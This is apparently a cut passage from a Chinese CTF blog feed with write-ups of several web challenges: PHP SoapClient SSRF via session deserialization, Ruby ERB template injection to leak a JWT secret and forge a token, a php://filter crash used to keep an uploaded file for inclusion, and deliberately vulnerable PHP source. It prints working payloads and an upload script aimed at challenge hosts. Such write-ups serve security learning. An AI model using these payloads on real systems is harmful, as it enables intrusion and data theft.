</li><li>如果能够改变序列化的模式，比如默认是PHP，将其改为<code>php_serialize</code>，出入序列化前面加上<code>|</code>，这样反序列化时，按默认的<code>php</code>时，传入的序列化就被反序列化了      </li></ul></li></ul><ul><li><p>PHP原生类<code>SoapClient</code>，当其中的<code>__call</code>方法触发时可以发送HTTP和HTTPs请求</p><ul><li><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code>      </li><li>第一个参数指明是否为<code>wsdl模式</code>     </li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。   </li><li><a href="https://www.anquanke.com/post/id/153065#h2-1">soap</a>    </li></ul></li><li><p><a href="https://www.jianshu.com/p/d4c304dbd0af"><code>CRLF Injection</code></a>       </p><ul><li>简单说就是在请求头中注入<code>\r\n</code>,从而生成新的请求头，或者覆盖原来的请求头，或者注入<code>\r\n\r\n</code>,注入请求（头和体由两个<code>\r\n</code>分割）     </li></ul></li></ul><h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$b = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func($_GET[<span class="hljs-string">&#x27;f&#x27;</span>], $_POST);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;    $_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];&#125;var_dump($_SESSION);$a = <span class="hljs-keyword">array</span>(reset($_SESSION), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func($b, $a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>一开始，直接一个<code>$_POST</code>没反应过来<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/6b2ec884-06ae-4190-b0fd-89028778c220.png" alt="02.png"></p><p>发现<code>flag.php</code>      </p><pre><code><pre><code class="hljs php">only localhost can get flag!session_start();<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;$flag = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;       $_SESSION[<span class="hljs-string">&#x27;flag&#x27;</span>] = $flag;   &#125;only localhost can get flag!</code></pre></code></pre><p>解题思路：首先可以通过第一个<code>call_user_func</code>覆盖<code>serialize_handler</code>为<code>php_serialize</code>，在name中写入利用<code>soapClient</code>产生的序列化；第二次通过<code>extract</code>覆盖变量<code>b</code>为<code>call_user_func</code>，name为<code>SoapClient</code>，当<code>call_user_func</code>的参数为一个数组时，会把键名当作一个类名，值当作方法；</p><p><code>call_user_func($b, $a);</code>——&gt;<code>call_user_func(call_user_func(array(SoapClient,&#39;welcome_to_the_lctf2018&#39;)))</code>——&gt;<code>SoapClient-&gt;welcome_to_the_lctf2018()</code>—–&gt;没有这个方法，从而调用<code>__call</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));$payload = urlencode(serialize($attack));<span class="hljs-keyword">echo</span> $payload;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>第一次使用SoapClient类会报错，需要在<code>php.ini</code>中打开<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/3910e692-bdd4-40f7-b076-82fa36305fac.png" alt="01.png"></p><p>传入 </p><pre><code>f=session_start&amp;name=[生成的payload]         POST: serializer_handler=php_serialize</code></pre><p>然后传</p><pre><code>f=extract&amp;name=SoapClienPOST:b=call_user_func   </code></pre><p>来触发类    </p><p>但我这里没成功，试了好几个师傅的都不行        </p><p>算了    </p><p>就当积累知识点吧</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>serialize</tag>
      
      <tag>原生类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flag Shop</title>
    <link href="/2021/05/04/BUU82/"/>
    <url>/2021/05/04/BUU82/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="|_|-|"></a>|_|-|</h2><p>打开环境</p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/172950/8/7918/21544/60915946Edcb47200/b52ca327067e551d.png" alt="01.png"></p><p>点一下<code>buy flag</code>     </p><p>弹出了<code>&#123;&quot;title&quot;:&quot;error&quot;,&quot;message&quot;:&quot;no enough jkl&quot;&#125;</code>     </p><p>想到了应该是要伪造cookie     </p><p>顺便看看<code>robots.txt</code>，居然有    </p><pre><code>User-agent: *Disallow: /filebak     </code></pre><p><code>/filebak</code>     </p><pre><code>```rubyrequire &#39;sinatra&#39;require &#39;sinatra/cookies&#39;require &#39;sinatra/json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#39;/shop&#39;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;/shop&#39;)  endend```   </code></pre><p>虽然看不懂是啥，但看到了jwt     </p><p>cookie应该就是jwt了吧     </p><p>解码一下     </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181071/5/2256/71195/60915948Eaa5fb2dd/e6380093c94ee610.png" alt="02.png">   </p><p>确实，试着用<code>jwtcrack</code>爆破一下secret      </p><p>爆了一会，感觉爆不出来    </p><p>难道不是这个考点    </p><p>回去看那个源码    </p><p>看不懂     </p><p>还是去看WP吧   </p><hr><p>ruby的ERB模板注入     </p><p>主要的代码    </p><pre><code>```rubyget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endend```      </code></pre><p>参数<code>SECRET</code>与真的<code>SECRET</code>匹配，成功则返回flag    </p><p>参数<code>do</code>与<code>name</code>，如果do的值与name的前七位加上<code> is working</code>一样，会弹出<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code><br>这里存在模板注入</p><p>REB模板注入的格式<code>&lt;%=7*7%&gt;</code>——-&gt;49      </p><p>然后是ruby中的<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义变量</a>–&gt;<code>$&#39;</code>返回最后一次成功匹配右边的字符串      </p><p>最后一次成功匹配？？？上面那个？？</p><p>构造<code>&lt;%=$&#39;%&gt;</code>正好七位     </p><p>还要hex编码，不知道为什么。。。。。。。       </p><p>payload：<code>/work?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working</code>     </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/171834/33/7788/70013/60915948Eff3e1215/1de2e42b943ae0db.png" alt="03.png">   </p><p>返回的就是SECRET   </p><p>构造新的jwt    </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194760/8/1229/73202/60915947E03771f73/f2ef6f29d8c4d0dc.png" alt="04.png"> </p><p>写入cookie     </p><p>flag在返回头的cookie里    </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/180216/2/2292/80981/60915947E137ed448/8c24414f41a9b8de.png" alt="05.png">     </p><p><a href="https://www.anquanke.com/post/id/86867">REB SSTI</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>jwt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>jwt</tag>
      
      <tag>ruby</tag>
      
      <tag>ERB</tag>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ezinclude</title>
    <link href="/2021/05/01/BUU81/"/>
    <url>/2021/05/01/BUU81/</url>
    
    <content type="html"><![CDATA[<h2 id="【-】"><a href="#【-】" class="headerlink" title="【-+-    -+-】"></a><code>【-+-    -+-】</code></h2><p>进入环境<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/ec2beb98-e0a5-42f4-82d7-a399394609fe.png" alt="01.png">      </p><p>注释中有Hint      </p><p><code>&lt;!--md5($secret.$name)===$pass --&gt;</code>        </p><p>应该是要传入name和pass       </p><p>响应头里有一段hash值       </p><p>当成pass传入，name不传     </p><p><code>?pass=fa25e54758d5d5c1927781a6ede89f8a</code>      </p><p>有跳转，抓包     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/1454b3cd-95be-480e-a3e5-4f6e0ce65151.png" alt="02.png">       </p><p>看一下<code>flflflflag.php</code>     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/2e856e0a-e4e7-42c6-a5cd-3de410a8da3f.png" alt="03.png"></p><p>有include，伪协议读一下源码      </p><p><code>?file=php://filter/read=convert.base64.encode/resource=flflflflag.php</code>       </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/636b976a-82d7-40c9-b96b-5cb660f19217.png" alt="04.png">     </p><p>解码后       </p><pre><code><pre><code class="hljs php">&lt;html&gt;&lt;head&gt;&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;<span class="hljs-meta">&lt;?php</span>$file=$_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);&#125;@<span class="hljs-keyword">include</span>($file);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<span class="hljs-meta">?&gt;</span>&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p>感觉也没啥啊       </p><p>接下来利用<code>php://filter/string.strip_tags</code>       </p><p>php7.0的BUG</p><p>payload:<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>       </p><p>输入payload后，会导致PHP崩溃清空堆栈重启，如果同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell         </p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick </a></p><p>上传脚本     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIOurl=<span class="hljs-string">&#x27;http://e17fbb9d-53e9-44fc-9c60-91d0f4e7e017.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>file=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:BytesIO(<span class="hljs-string">b&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)&#125;r=requests.post(url=url,files=file,allow_redirects=<span class="hljs-literal">False</span>)print(<span class="hljs-string">&quot;YEs&quot;</span>)</code></pre></code></pre><p>应该写一句话木马的，但我试了好几次都没成功，<code>phpinfo();</code>都没法执行       </p><p>然后会在<code>dir.php</code>（包含/tmp中的文件）中得到文件名       </p><p><code>array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [4]=&gt; string(9) &quot;phpTwf0sR&quot;</code>      </p><p>包含即可      </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/4f1e5174-3581-4ee9-bbc9-9e1cd96ee7f2.png" alt="05.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>文件读取</tag>
      
      <tag>php://filter/string.strip_tags</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easyphp</title>
    <link href="/2021/04/30/BUU80/"/>
    <url>/2021/04/30/BUU80/</url>
    
    <content type="html"><![CDATA[<h2 id="unserialize-char-escape"><a href="#unserialize-char-escape" class="headerlink" title="unserialize char-escape"></a>unserialize char-escape</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186967/37/782/447665/608c1c8bE8f062515/dd33c81b065b285b.png" alt="01.png"></p><p>没有<code>registe.php</code>     </p><p>一开始猜的是SQL注入       </p><p>注入了一会，有点想放弃了，看了下<code>www.zip</code>   </p><p>居然有     </p><p>看来不是SQLi了      </p><p>四个PHP文件    </p><p><code>index.php</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;<span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/&quot;</span>.$_GET[<span class="hljs-string">&#x27;action&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>lib.php</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$parm</span>)</span><span class="hljs-function"></span>&#123;    $array = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;regexp&#x27;</span>, <span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-string">&#x27;into&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;alter&quot;</span>);    <span class="hljs-keyword">return</span> str_replace($array, <span class="hljs-string">&#x27;hacker&#x27;</span>, $parm);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $id;    <span class="hljs-keyword">public</span> $age = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">public</span> $nickname = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;            $mysqli = <span class="hljs-keyword">new</span> dbCtrl();            <span class="hljs-keyword">$this</span>-&gt;id = $mysqli-&gt;login(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;id) &#123;                $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;id;                $_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>];                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好！&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;id;            &#125;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $Info = unserialize(<span class="hljs-keyword">$this</span>-&gt;getNewinfo());        $age = $Info-&gt;age;        $nickname = $Info-&gt;nickname;        $updateAction = <span class="hljs-keyword">new</span> UpdateHelper($_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>], $Info, <span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>]);        <span class="hljs-comment">//这个功能还没有写完 先占坑</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $age = $_POST[<span class="hljs-string">&#x27;age&#x27;</span>];        $nickname = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age, $nickname)));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;nickname); <span class="hljs-comment">//危</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;nickname-&gt;update(<span class="hljs-keyword">$this</span>-&gt;age);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age;    <span class="hljs-keyword">public</span> $nickname;    <span class="hljs-keyword">public</span> $CtrlCase;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age, $nickname</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;age = $age;        <span class="hljs-keyword">$this</span>-&gt;nickname = $nickname;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name, $argument</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="hljs-number">0</span>]);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $id;    <span class="hljs-keyword">public</span> $newinfo;    <span class="hljs-keyword">public</span> $sql;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo, $sql</span>)</span><span class="hljs-function">    </span>&#123;        $newInfo = unserialize($newInfo);        $upDate = <span class="hljs-keyword">new</span> dbCtrl();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;sql;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $hostname = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;    <span class="hljs-keyword">public</span> $dbuser = <span class="hljs-string">&quot;root&quot;</span>;    <span class="hljs-keyword">public</span> $dbpass = <span class="hljs-string">&quot;root&quot;</span>;    <span class="hljs-keyword">public</span> $database = <span class="hljs-string">&quot;test&quot;</span>;    <span class="hljs-keyword">public</span> $name;    <span class="hljs-keyword">public</span> $password;    <span class="hljs-keyword">public</span> $mysqli;    <span class="hljs-keyword">public</span> $token;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];        <span class="hljs-keyword">$this</span>-&gt;password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];        <span class="hljs-keyword">$this</span>-&gt;token = $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">$sql</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;hostname, <span class="hljs-keyword">$this</span>-&gt;dbuser, <span class="hljs-keyword">$this</span>-&gt;dbpass, <span class="hljs-keyword">$this</span>-&gt;database);        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error);        &#125;        $result = <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;token == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;            <span class="hljs-keyword">return</span> $idResult;        &#125;        <span class="hljs-keyword">if</span> (!$idResult) &#123;            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">if</span> (md5(<span class="hljs-keyword">$this</span>-&gt;password) !== $passwordResult) &#123;            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;密码错误！&#x27;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;name;        <span class="hljs-keyword">return</span> $idResult;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$sql</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//还没来得及写</span>    &#125;&#125;</code></pre></code></pre><p><code>login.php</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<span class="hljs-meta">?&gt;</span>&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt; &lt;title&gt;login&lt;/title&gt;&lt;center&gt;&lt;form action=<span class="hljs-string">&quot;login.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;UserName&quot;</span> required&gt;&lt;br&gt;&lt;input type=<span class="hljs-string">&quot;password&quot;</span> style=<span class="hljs-string">&quot;margin-top: 20&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span> required&gt;&lt;br&gt;&lt;button style=<span class="hljs-string">&quot;margin-top:20;&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;&lt;br&gt;&lt;img src=<span class="hljs-string">&#x27;img/1.jpg&#x27;</span>&gt;大家记得做好防护&lt;/img&gt;&lt;br&gt;&lt;br&gt;<span class="hljs-meta">&lt;?php</span> $user=<span class="hljs-keyword">new</span> user();<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br&gt;Damn you, 